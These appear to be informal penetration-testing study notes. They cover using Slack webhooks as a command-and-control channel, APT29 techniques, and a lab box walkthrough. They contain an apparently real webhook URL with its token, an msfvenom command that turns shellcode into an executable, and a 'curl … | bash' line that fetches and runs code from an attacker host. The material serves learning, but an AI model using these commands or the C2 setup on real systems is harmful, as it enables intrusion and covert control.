# looking at ippsec techniques

# setting slack web hooks and C2
make the channel private
webhook integrations
https://hooks.slack.com/services/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

$body = COnvertTo-Json @{
    pretext = "Automated"
    text = "Hi there"
}
Invoke-RestMethod https://hooks.slack.com/services/
B0559PG99FC/Ej96lpmHngg1OV7htEKcfk3n -Method Post -Body $body -ContentType "application/json"

![](message_passed.png)

### using this as a C2

https://3xpl01tc0d3r.blogspot.com/2018/06/how-to-use-slack-as-c2-sever.html

using a slackshell


# analysing APT 29

https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/

APT 29 uses lnk files in a zip format

ippsec.rocks

uses dll injection into microsoft updater

we can create one by cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform win -o pleasesubscribe.exe

we can open this up in x64dbg
needs to be done in x64dbg file

# oscp tj null list

bashed

`nmap -sC -sV -oA nmap/initial 10.10.10.65`

based on httpd version you can decide on th elinux kernel

you can execute the file by host ing it using smiple HHTPserver and then saying curl http://10.10.10.1/new | bash

LInenum.sh


